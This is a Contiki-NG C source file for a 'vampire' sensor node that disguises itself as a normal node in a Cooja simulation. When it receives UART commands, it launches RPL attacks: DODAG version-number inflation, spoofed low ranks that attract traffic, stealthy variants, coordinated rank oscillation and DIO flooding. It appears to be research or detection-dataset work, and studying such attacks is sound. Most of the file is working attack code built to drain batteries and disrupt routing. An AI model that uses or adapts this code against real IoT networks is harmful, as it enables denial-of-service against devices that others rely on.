/*
 * VAMPIRE SWITCHABLE NODE
 * 
 * Node HÒA NHẬP HOÀN TOÀN vào mạng như node bình thường
 * Chỉ chuyển sang attack mode khi nhận lệnh qua UART từ Cooja script
 * 
 * Commands:
 *   START_CAROUSEL_ATTACK - Kích hoạt carousel attack
 *   START_STRETCH_ATTACK  - Kích hoạt stretch attack
 *   START_STEALTH_ATTACK  - Kích hoạt stealth attack
 *   START_COORDINATED_ATTACK - Kích hoạt coordinated attack
 *   STOP_ATTACK           - Dừng tất cả attacks
 */

#include "contiki.h"
#include "net/routing/routing.h"
#include "net/routing/rpl-lite/rpl.h"   
#include "net/routing/rpl-lite/rpl-icmp6.h"
#include "net/routing/rpl-lite/rpl-timers.h"
#include "net/netstack.h"
#include "simple-udp.h"
#include "sys/energest.h"
#include "sys/node-id.h"
#include "sys/log.h"
#include "lib/random.h"
#include "dev/serial-line.h"

#define LOG_MODULE "NODE"  // Use same log module as normal nodes!
#define LOG_LEVEL LOG_LEVEL_INFO

#define SEND_PORT 8765
#define SEND_INTERVAL     (60 * CLOCK_SECOND)  // Same as normal nodes
#define STATUS_INTERVAL   (5 * CLOCK_SECOND)   // Same as normal nodes

#define INITIAL_ENERGY_MJ 15000  // Same as normal nodes

// Energy parameters - SAME as normal nodes
#define VOLTAGE_V        3.0
#define CURRENT_TX_MA    17.4
#define CURRENT_RX_MA    20.0
#define CURRENT_CPU_MA    1.8
#define CURRENT_LPM_MA    0.0545

/* Attack modes - Only 4 types supported */
typedef enum {
    MODE_NORMAL = 0,
    MODE_CAROUSEL,
    MODE_STRETCH,
    MODE_STEALTH,
    MODE_COORDINATED
} attack_mode_t;

/* Sensor payload - SAME as normal nodes */
typedef struct {
  uint16_t cluster_id;
  uint16_t node_id_f;
  uint32_t seqno;
  uint32_t residual_mj;
  uint32_t tx_time;
  int16_t temperature_c;
} sensor_payload_t;

/* Energy tracking - SAME as normal nodes */
static uint32_t residual_mj = INITIAL_ENERGY_MJ;
static uint32_t last_cpu, last_lpm, last_tx, last_rx;
static uint32_t sim_start_time;
static uint8_t node_is_dead = 0;

/* Coordinated attack phases */
typedef enum {
    PHASE_CAROUSEL = 0,
    PHASE_STRETCH = 1,
    PHASE_IDLE = 2
} coord_phase_t;

/* Attack parameters */
#define CAROUSEL_VERSION_INTERVAL (15 * CLOCK_SECOND)
#define CAROUSEL_DIO_INTERVAL     (2 * CLOCK_SECOND)
#define STRETCH_RANK_INTERVAL     (10 * CLOCK_SECOND)
#define STEALTH_VERSION_INTERVAL  (60 * CLOCK_SECOND)
#define STEALTH_RANK_INTERVAL     (90 * CLOCK_SECOND)
#define COORD_PHASE_SWITCH_INTERVAL (30 * CLOCK_SECOND)
#define COORD_CAROUSEL_INTERVAL     (2 * CLOCK_SECOND)
#define COORD_STRETCH_INTERVAL      (2 * CLOCK_SECOND)

static struct simple_udp_connection udp_conn;
static attack_mode_t current_mode = MODE_NORMAL;

/* Energy tracking function - SAME as normal nodes */
static double
energy_tick_and_get_duty(void)
{
  if(node_is_dead) {
    return 0.0;
  }

  uint32_t cpu = energest_type_time(ENERGEST_TYPE_CPU) - last_cpu;
  uint32_t lpm = energest_type_time(ENERGEST_TYPE_LPM) - last_lpm;
  uint32_t tx  = energest_type_time(ENERGEST_TYPE_TRANSMIT) - last_tx;
  uint32_t rx  = energest_type_time(ENERGEST_TYPE_LISTEN) - last_rx;
  last_cpu += cpu; last_lpm += lpm; last_tx += tx; last_rx += rx;

  double t_cpu = (double)cpu / ENERGEST_SECOND;
  double t_lpm = (double)lpm / ENERGEST_SECOND;
  double t_tx  = (double)tx  / ENERGEST_SECOND;
  double t_rx  = (double)rx  / ENERGEST_SECOND;

  double consumed_mj = VOLTAGE_V * (CURRENT_CPU_MA * t_cpu + CURRENT_LPM_MA * t_lpm
                                    + CURRENT_TX_MA  * t_tx  + CURRENT_RX_MA  * t_rx);
  
  if(consumed_mj >= (double)residual_mj) {
    residual_mj = 0;
  } else {
    residual_mj -= (uint32_t)consumed_mj;
  }

  double elapsed_radio_on_s = t_tx + t_rx;
  double elapsed_total_s = t_cpu + t_lpm;
  return elapsed_total_s > 0 ? (elapsed_radio_on_s / elapsed_total_s) * 100.0 : 0.0;
}

PROCESS(node_process, "Sensor node");  // SAME name as normal nodes!
PROCESS(status_process, "Status reporter");  // Add status process!
PROCESS(attack_control_process, "Attack controller");  // Separate attack control
AUTOSTART_PROCESSES(&node_process, &status_process, &attack_control_process);

/*---------------------------------------------------------------------------*/
static void
execute_carousel_attack(void)
{
    LOG_INFO("execute_carousel_attack() called, curr_instance.used=%d\n", curr_instance.used);
    
    // CRITICAL: Wait for RPL to join network before attacking
    if(!curr_instance.used) {
        LOG_WARN("CAROUSEL: RPL not ready yet, skipping attack (will retry next cycle)\n");
        return;
    }
    
    // CRITICAL: Must have valid rank (not INFINITE_RANK)
    if(curr_instance.dag.rank >= 65535) {
        LOG_WARN("CAROUSEL: Rank not initialized (rank=%u), skipping attack (will retry)\n", 
                 curr_instance.dag.rank);
        return;
    }
    
    // CRITICAL: Must have stable parent
    if(curr_instance.dag.preferred_parent == NULL) {
        LOG_WARN("CAROUSEL: No parent yet, skipping attack (will retry)\n");
        return;
    }
    
    // Additional check: có parent chưa? (không bắt buộc nhưng tốt hơn)
    if(!NETSTACK_ROUTING.node_is_reachable()) {
        LOG_WARN("CAROUSEL: Node not reachable yet, skipping attack (will retry)\n");
        return;
    }
    
    // SAVE current version to restore later
    static uint8_t legitimate_version = 0;
    if(legitimate_version == 0) {
        legitimate_version = curr_instance.dag.version;
    }
    
    uint8_t old_version = curr_instance.dag.version;
    
    // CAROUSEL ATTACK: Aggressive version manipulation
    curr_instance.dag.version += 50;  // Large increment for strong impact
    
    LOG_INFO("CAROUSEL_ATTACK version_manipulation: %u -> %u TAG:ACTION=VERSION_MANIP\n", 
             old_version, curr_instance.dag.version);
    
    // Send attack DIO using Trickle reset and single direct transmission
    LOG_INFO("Sending attack DIO with version %u...\n", curr_instance.dag.version);
    rpl_timers_dio_reset("carousel_attack");
    rpl_icmp6_dio_output(NULL);
    LOG_INFO("CAROUSEL: DIO transmission completed\n");
    
    // RESTORE legitimate version to maintain own connectivity
    // Note: Don't restore immediately - let attack propagate for a bit
    // It will naturally sync back through parent DIOs
}
/*---------------------------------------------------------------------------*/
static void
execute_stretch_attack(void)
{
    LOG_INFO("execute_stretch_attack() called, curr_instance.used=%d, has_parent=%d\n", 
             curr_instance.used, 
             (curr_instance.dag.preferred_parent != NULL));
    
    if(!curr_instance.used) {
        LOG_WARN("STRETCH: RPL not ready, skipping (will retry)\n");
        return;
    }
    
    // CRITICAL: Must have valid rank
    if(curr_instance.dag.rank >= 65535) {
        LOG_WARN("STRETCH: Rank not initialized (rank=%u), skipping (will retry)\n",
                curr_instance.dag.rank);
        return;
    }
    
    // CRITICAL: Must have parent
    if(curr_instance.dag.preferred_parent == NULL) {
        LOG_WARN("STRETCH: No parent yet, skipping (will retry)\n");
        return;
    }
    
    if(!NETSTACK_ROUTING.node_is_reachable()) {
        LOG_WARN("STRETCH: Not reachable, skipping (will retry)\n");
        return;
    }
    
    // SAVE current legitimate rank to restore after attack
    static rpl_rank_t legitimate_rank = 0;
    if(legitimate_rank == 0 || legitimate_rank == 65535) {
        legitimate_rank = curr_instance.dag.rank;
    }
    
    rpl_rank_t old_rank = curr_instance.dag.rank;
    
    // STRETCH ATTACK: Advertise as attractive parent (low rank)
    // Use 200 to be very attractive but not identical to root (128)
    rpl_rank_t malicious_rank = 200;  
    
    // Lock rank temporarily for attack DIO
    rank_locked = true;
    curr_instance.dag.rank = malicious_rank;
    
    LOG_INFO("STRETCH_ATTACK rank_manipulation: %u -> %u (LOCKED!) TAG:ACTION=RANK_MANIP\n", 
             old_rank, malicious_rank);
    
    // Send attack DIO using Trickle reset and single direct transmission (prevents queue overflow)
    LOG_INFO("Sending attack DIO with rank %u...\n", malicious_rank);
    rpl_timers_dio_reset("stretch_attack");
    rpl_icmp6_dio_output(NULL);
    LOG_INFO("STRETCH: DIO transmission completed\n");
    
    // RESTORE legitimate rank and unlock
    curr_instance.dag.rank = legitimate_rank;
    rank_locked = false;
    
    LOG_INFO("STRETCH: Restored legitimate rank %u, unlocked\n", legitimate_rank);
}
/*---------------------------------------------------------------------------*/
/*---------------------------------------------------------------------------*/
static void
execute_stealth_attack_version(void)
{
    if(!curr_instance.used || curr_instance.dag.rank >= 65535 || curr_instance.dag.preferred_parent == NULL) {
        LOG_WARN("STEALTH_VERSION: Not ready (used=%d, rank=%u, parent=%d), skipping\n",
                curr_instance.used, curr_instance.dag.rank, 
                (curr_instance.dag.preferred_parent != NULL));
        return;
    }
    
    if(!NETSTACK_ROUTING.node_is_reachable()) {
        LOG_WARN("STEALTH_VERSION: Not reachable, skipping (will retry)\n");
        return;
    }
    
    uint8_t old_version = curr_instance.dag.version;
    curr_instance.dag.version += 5;  // Subtle but effective
    
    LOG_INFO("STEALTH_ATTACK subtle_version: %u -> %u TAG:ACTION=VERSION_MANIP\n", 
             old_version, curr_instance.dag.version);
    
    LOG_INFO("Calling rpl_timers_dio_reset()...\n");
    rpl_timers_dio_reset("stealth_version");
    
    rpl_icmp6_dio_output(NULL);
    LOG_INFO("STEALTH: 1x DIO transmission requested (version)\n");
}
/*---------------------------------------------------------------------------*/
static void
execute_stealth_attack_rank(void)
{
    if(!curr_instance.used) {
        return;
    }
    
    rpl_rank_t old_rank = curr_instance.dag.rank;
    curr_instance.dag.rank += 500;  // Moderate increase
    
    LOG_INFO("STEALTH_ATTACK subtle_rank: %u -> %u TAG:ACTION=RANK_MANIP\n", 
             old_rank, curr_instance.dag.rank);
    
    LOG_INFO("Calling rpl_timers_dio_reset()...\n");
    rpl_timers_dio_reset("stealth_rank");
    
    rpl_icmp6_dio_output(NULL);
    LOG_INFO("STEALTH: 1x DIO transmission requested (rank)\n");
}
/*---------------------------------------------------------------------------*/
static void
execute_coordinated_carousel(void)
{
    if(!curr_instance.used || curr_instance.dag.rank >= 65535 || curr_instance.dag.preferred_parent == NULL) {
        LOG_WARN("COORDINATED_CAROUSEL: Not ready (used=%d, rank=%u, parent=%d), skipping\n",
                curr_instance.used, curr_instance.dag.rank,
                (curr_instance.dag.preferred_parent != NULL));
        return;
    }
    
    if(!NETSTACK_ROUTING.node_is_reachable()) {
        LOG_WARN("COORDINATED_CAROUSEL: Not reachable, skipping (will retry)\n");
        return;
    }
    
    uint8_t old_version = curr_instance.dag.version;
    
    // COORDINATED: Rapid version oscillation (distinctive pattern!)
    // Each node adds different increment based on node_id
    uint8_t version_delta = 8 + (node_id % 3) * 3;  // 8, 11, or 14
    curr_instance.dag.version += version_delta;
    
    LOG_INFO("COORDINATED_ATTACK_CAROUSEL: version %u -> %u (delta=%u) TAG:ACTION=VERSION_MANIP\n", 
             old_version, curr_instance.dag.version, version_delta);
    
    LOG_INFO("Calling rpl_timers_dio_reset()...\n");
    rpl_timers_dio_reset("coordinated_carousel");
    
    // Flood more aggressively than single attack
    rpl_icmp6_dio_output(NULL);
    rpl_icmp6_dio_output(NULL);
    rpl_icmp6_dio_output(NULL);
    LOG_INFO("COORDINATED: 3x DIO transmission requested (carousel phase)\n");
}
/*---------------------------------------------------------------------------*/
static void
execute_coordinated_stretch(void)
{
    if(!curr_instance.used || curr_instance.dag.rank >= 65535 || curr_instance.dag.preferred_parent == NULL) {
        LOG_WARN("COORDINATED_STRETCH: Not ready (used=%d, rank=%u, parent=%d), skipping\n",
                curr_instance.used, curr_instance.dag.rank,
                (curr_instance.dag.preferred_parent != NULL));
        return;
    }
    
    // SAVE legitimate rank
    static rpl_rank_t legitimate_rank = 0;
    if(legitimate_rank == 0 || legitimate_rank == 65535) {
        legitimate_rank = curr_instance.dag.rank;
    }
    
    rpl_rank_t old_rank = curr_instance.dag.rank;
    
    // COORDINATED: Oscillating rank (creates distinctive traffic pattern!)
    // Nodes alternate between low and high ranks
    static uint8_t oscillation = 0;
    oscillation++;
    
    rpl_rank_t target_rank;
    if(oscillation % 2 == 0) {
        // Low rank - attract traffic
        target_rank = 200 + (node_id % 3) * 50;  // 200, 250, 300
    } else {
        // Medium rank - repel traffic  
        target_rank = 600 + (node_id % 3) * 100; // 600, 700, 800
    }
    
    // LOCK and attack
    rank_locked = true;
    curr_instance.dag.rank = target_rank;
    
    LOG_INFO("COORDINATED_ATTACK_STRETCH: rank %u -> %u (oscillation=%u) TAG:ACTION=RANK_MANIP\n", 
             old_rank, target_rank, oscillation);
    
    // Send attack DIOs
    rpl_icmp6_dio_output(NULL);
    rpl_icmp6_dio_output(NULL);
    LOG_INFO("COORDINATED: 2x DIO transmission completed (stretch phase)\n");
    
    // RESTORE and unlock
    curr_instance.dag.rank = legitimate_rank;
    rank_locked = false;
    LOG_INFO("COORDINATED: Restored legitimate rank %u\n", legitimate_rank);
}
/*---------------------------------------------------------------------------*/
/* NORMAL NODE BEHAVIOR - Exact same as node.c */
/*---------------------------------------------------------------------------*/
PROCESS_THREAD(node_process, ev, data)
{
  static struct etimer et;
  static uip_ipaddr_t dest_ipaddr;
  static uint16_t cluster_id;
  static uint32_t gen_count = 0, sent_count = 0;

  PROCESS_BEGIN();
  sim_start_time = clock_time();

  simple_udp_register(&udp_conn, SEND_PORT, NULL, SEND_PORT, NULL);
  etimer_set(&et, random_rand() % SEND_INTERVAL);
  PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&et));

  while(1) {
    etimer_set(&et, SEND_INTERVAL);
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&et));

    energy_tick_and_get_duty();
    
    if(residual_mj == 0 && !node_is_dead) {
      node_is_dead = 1;
      uint32_t alive_s = (clock_time() - sim_start_time) / CLOCK_SECOND;
      
      LOG_INFO("DEAD cluster=%u node=%u time_alive_s=%lu last_seq=%lu total_gen=%lu total_sent=%lu\n",
               cluster_id, node_id, (unsigned long)alive_s,
               (unsigned long)(sent_count > 0 ? sent_count - 1 : 0), 
               (unsigned long)gen_count, (unsigned long)sent_count);
      
      PROCESS_EXIT();
    }
    
    if(node_is_dead) {
      PROCESS_EXIT();
    }

    gen_count++;

    if(NETSTACK_ROUTING.node_is_reachable() &&
       NETSTACK_ROUTING.get_root_ipaddr(&dest_ipaddr)) {
      
      uint8_t root_id = dest_ipaddr.u8[15];
      if(root_id == 1) cluster_id = 1;
      else if(root_id == 27 || root_id == 0x1b) cluster_id = 2;

      LOG_INFO("GEN cluster=%u node=%u gen_count=%lu\n", cluster_id, node_id, (unsigned long)gen_count);

      sensor_payload_t p = {
        .cluster_id = cluster_id, .node_id_f = node_id,
        .seqno = sent_count++, .residual_mj = residual_mj, .tx_time = clock_time(),
        .temperature_c = (int16_t)(250 + (random_rand() % 50))
      };
      simple_udp_sendto(&udp_conn, &p, sizeof(p), &dest_ipaddr);
      LOG_INFO("TX cluster=%u node=%u seq=%lu energy_mj=%lu bytes=%u\n",
               cluster_id, node_id, (unsigned long)p.seqno,
               (unsigned long)residual_mj, (unsigned int)sizeof(p));
    } else {
      LOG_INFO("GEN cluster=%u node=%u gen_count=%lu\n", cluster_id, node_id, (unsigned long)gen_count);
      LOG_INFO("TXFAIL cluster=%u node=%u gen_count=%lu\n", cluster_id, node_id, (unsigned long)gen_count);
    }
  }
  PROCESS_END();
}

/*---------------------------------------------------------------------------*/
/* STATUS REPORTER - Same as normal nodes */
/*---------------------------------------------------------------------------*/
PROCESS_THREAD(status_process, ev, data)
{
  static struct etimer et;
  PROCESS_BEGIN();
  
  while(1) {
    etimer_set(&et, STATUS_INTERVAL);
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&et));

    if(node_is_dead) {
      LOG_INFO("STATUS node=%u STOPPED\n", node_id);
      PROCESS_EXIT();
    }

    double duty = energy_tick_and_get_duty();
    uint16_t rank = curr_instance.dag.rank;
    LOG_INFO("STATUS node=%u energy_mj=%lu duty_pct=%d rank=%u\n",
             node_id, (unsigned long)residual_mj, (int)duty, rank);
  }
  PROCESS_END();
}

/*---------------------------------------------------------------------------*/
/* ATTACK CONTROLLER - Separate process for attack commands */
/*---------------------------------------------------------------------------*/
PROCESS_THREAD(attack_control_process, ev, data)
{
  static struct etimer attack_timer1;
  static struct etimer attack_timer2;
  static struct etimer phase_timer;
  static coord_phase_t coord_phase = PHASE_CAROUSEL;
  static uint8_t phase_count = 0;
  
  PROCESS_BEGIN();

  serial_line_init();
  
  LOG_INFO("============================================\n");
  LOG_INFO("ATTACK CONTROLLER READY (node %u)\n", node_id);
  LOG_INFO("Waiting for attack commands via UART...\n");
  LOG_INFO("Node behaves as NORMAL until attack command\n");
  LOG_INFO("============================================\n");

  while(1) {
    PROCESS_WAIT_EVENT();

    /* Handle UART commands */
    if(ev == serial_line_event_message && data != NULL) {
        char *cmd = (char *)data;
        
        LOG_INFO("Received command: %s\n", cmd);
        
        if(strncmp(cmd, "START_CAROUSEL_ATTACK", 21) == 0) {
            current_mode = MODE_CAROUSEL;
            LOG_INFO("=== ACTIVATING CAROUSEL ATTACK ===\n");
            LOG_INFO("TAG: ATTACK_TYPE=CAROUSEL\n");
            etimer_set(&attack_timer1, CAROUSEL_VERSION_INTERVAL);
            etimer_set(&attack_timer2, CAROUSEL_DIO_INTERVAL);
        }
        else if(strncmp(cmd, "START_STRETCH_ATTACK", 20) == 0) {
            current_mode = MODE_STRETCH;
            LOG_INFO("=== ACTIVATING STRETCH ATTACK ===\n");
            LOG_INFO("TAG: ATTACK_TYPE=STRETCH\n");
            etimer_set(&attack_timer1, STRETCH_RANK_INTERVAL);
        }
        else if(strncmp(cmd, "START_STEALTH_ATTACK", 20) == 0) {
            current_mode = MODE_STEALTH;
            LOG_INFO("=== ACTIVATING STEALTH ATTACK ===\n");
            LOG_INFO("TAG: ATTACK_TYPE=STEALTH\n");
            etimer_set(&attack_timer1, STEALTH_VERSION_INTERVAL);
            etimer_set(&attack_timer2, STEALTH_RANK_INTERVAL);
        }
        else if(strncmp(cmd, "START_COORDINATED_ATTACK", 24) == 0) {
            current_mode = MODE_COORDINATED;
            LOG_INFO("=== ACTIVATING COORDINATED ATTACK ===\n");
            LOG_INFO("TAG: ATTACK_TYPE=COORDINATED\n");
            
            // Initial phase based on node ID
            if(node_id % 3 == 0) {
                coord_phase = PHASE_CAROUSEL;
                etimer_set(&attack_timer1, COORD_CAROUSEL_INTERVAL);
                LOG_INFO("Starting with CAROUSEL phase TAG:PHASE=CAROUSEL\n");
            } else if(node_id % 3 == 1) {
                coord_phase = PHASE_STRETCH;
                etimer_set(&attack_timer1, COORD_STRETCH_INTERVAL);
                LOG_INFO("Starting with STRETCH phase TAG:PHASE=STRETCH\n");
            } else {
                coord_phase = PHASE_IDLE;
                LOG_INFO("Starting with IDLE phase TAG:PHASE=IDLE\n");
            }
            etimer_set(&phase_timer, COORD_PHASE_SWITCH_INTERVAL);
        }
        else if(strncmp(cmd, "STOP_ATTACK", 11) == 0) {
            current_mode = MODE_NORMAL;
            rank_locked = false;  // Unlock rank
            LOG_INFO("=== STOPPING ALL ATTACKS ===\n");
            etimer_stop(&attack_timer1);
            etimer_stop(&attack_timer2);
            etimer_stop(&phase_timer);
        }
    }

    /* Execute attacks based on current mode */
    if(ev == PROCESS_EVENT_TIMER && data == &attack_timer1) {
        switch(current_mode) {
            case MODE_CAROUSEL:
                execute_carousel_attack();
                etimer_reset(&attack_timer1);
                break;
            case MODE_STRETCH:
                execute_stretch_attack();
                etimer_reset(&attack_timer1);
                break;
            case MODE_STEALTH:
                execute_stealth_attack_version();
                etimer_reset(&attack_timer1);
                break;
            case MODE_COORDINATED:
                if(coord_phase == PHASE_CAROUSEL) {
                    execute_coordinated_carousel();
                } else if(coord_phase == PHASE_STRETCH) {
                    execute_coordinated_stretch();
                }
                etimer_reset(&attack_timer1);
                break;
            default:
                break;
        }
    }

    /* Phase switching for coordinated attack */
    if(ev == PROCESS_EVENT_TIMER && data == &phase_timer) {
        if(current_mode == MODE_COORDINATED) {
            phase_count++;
            
            if(coord_phase == PHASE_CAROUSEL) {
                coord_phase = PHASE_STRETCH;
                etimer_stop(&attack_timer1);
                etimer_set(&attack_timer1, COORD_STRETCH_INTERVAL);
                LOG_INFO("COORDINATED_PHASE_SWITCH: CAROUSEL -> STRETCH (#%u) TAG:PHASE=STRETCH\n", phase_count);
            }
            else if(coord_phase == PHASE_STRETCH) {
                coord_phase = PHASE_IDLE;
                etimer_stop(&attack_timer1);
                LOG_INFO("COORDINATED_PHASE_SWITCH: STRETCH -> IDLE (#%u) TAG:PHASE=IDLE\n", phase_count);
            }
            else {
                coord_phase = PHASE_CAROUSEL;
                etimer_set(&attack_timer1, COORD_CAROUSEL_INTERVAL);
                LOG_INFO("COORDINATED_PHASE_SWITCH: IDLE -> CAROUSEL (#%u) TAG:PHASE=CAROUSEL\n", phase_count);
            }
            
            etimer_reset(&phase_timer);
        }
    }

    if(ev == PROCESS_EVENT_TIMER && data == &attack_timer2) {
        switch(current_mode) {
            case MODE_CAROUSEL:
                // DIO flooding
                if(curr_instance.used) {
                    rpl_icmp6_dio_output(NULL);
                }
                etimer_reset(&attack_timer2);
                break;
            case MODE_STEALTH:
                execute_stealth_attack_rank();
                etimer_reset(&attack_timer2);
                break;
            default:
                break;
        }
    }
  }
  PROCESS_END();
}
